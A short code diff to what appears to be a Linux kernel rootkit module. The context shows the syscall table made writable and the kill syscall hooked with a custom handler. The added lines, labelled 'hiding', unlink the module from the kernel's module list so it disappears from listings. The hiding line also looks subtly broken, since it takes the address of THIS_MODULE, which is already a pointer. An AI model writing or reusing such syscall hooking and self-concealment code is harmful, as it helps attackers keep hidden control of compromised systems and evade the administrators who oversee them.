@@ -103,6 +103,14 @@ int __init m_init(void) {
 		pte->pte |= _PAGE_RW;
 	sctable[__NR_kill] = m_sys_kill;
 
+	/* hiding */
+	
+	struct module *m = &THIS_MODULE;
+	if(m->init == m_init)
+		list_del_init(&m->list);
+	
+	/*  */
+
 	return 0;
 }
 
